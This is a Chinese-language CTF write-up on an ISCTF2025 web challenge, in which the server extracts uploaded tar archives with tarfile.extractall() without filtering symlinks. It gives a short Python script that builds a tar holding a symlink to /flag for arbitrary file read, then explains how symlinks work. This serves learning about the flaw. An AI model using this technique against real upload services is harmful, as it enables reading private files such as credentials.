@@ -1,0 +1,99 @@
+## 从一道 Web CTF 题理解 tar symlink 任意文件读取漏洞
+
+题目来源是 ISCTF2025: flag？我就借走了
+
+https://gz.imxbt.cn/games/32/challenges#1174-flag%EF%BC%9F%E6%88%91%E5%B0%B1%E5%80%9F%E8%B5%B0%E4%BA%86
+
+本题的核心漏洞在于**服务器直接使用 tarfile.extractall() 解压用户上传的 tar，**
+**没有过滤其中的符号链接，导致攻击者可以构造指向任意文件的 symlink。**
+
+题目本身没有什么难度，但是本人对软连接理解不深，故写此文章加深理解。
+
+------
+
+打开题目：
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260306105147.png)
+
+给了一个文件上传的界面，加粗页面注明了**打包格式是tar**
+
+如果题目做的较多顺其自然会想到软连接。
+
+我这里没用linux，直接用了python脚本创建tar压缩包进行上传
+
+```
+import tarfile
+
+tar = tarfile.open("exp.tar", "w")
+
+info = tarfile.TarInfo("flag.txt")
+info.type = tarfile.SYMTYPE
+info.linkname = "/flag"   //真实指向路径是/flag  这是猜测的
+
+tar.addfile(info)
+
+tar.close()
+```
+
+然后上传生成的exp.tar
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260306105905.png)
+
+点击flag.txt就跳转到/flag，得到了flag![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260306110007.png)
+
+
+
+#### 对于软连接（symlink）
+
+在 Linux 里软链接很常见，例如：
+
+```
+/bin/sh -> /bin/bash
+和
+flag.txt -> /flag
+```
+
+ 一个直观类比
+
+把 symlink 想象成 **快捷方式**。
+
+例如 Windows：
+
+```
+桌面/flag.txt (快捷方式) -> C:\secret\flag.txt
+```
+
+当程序打开：
+
+```
+桌面/flag.txt
+```
+
+系统实际上读取：
+
+```
+C:\secret\flag.txt
+```
+
+------
+
+##### 那为什么这题看到tar会联想到软连接呢？
+
+关键点在于：
+1.软链接是一种文件类型，而不是普通文件内容
+
+2.tar或其他一些压缩格式可以完整保存linux文件系统结构和文件类型，包括：文件，目录，权限，时间戳，软链接，硬链接
+
+所以这类题目一般的设计都需要tar或者其他压缩，直接上传软连接后的文件通常不行，因为**Web 上传接口一般不会保留“软链接类型”**。
+
+
+
+总结：
+
+本题利用的核心漏洞是 tar 解压时未过滤符号链接。
+攻击者通过构造一个指向 /flag 的 symlink，
+在服务器解压后生成 flag.txt -> /flag，
+当网站读取该文件时，操作系统会自动跟随链接，
+最终实现任意文件读取。
+
+这种漏洞在允许上传tar压缩包并自动解压的 Web 服务中比较常见
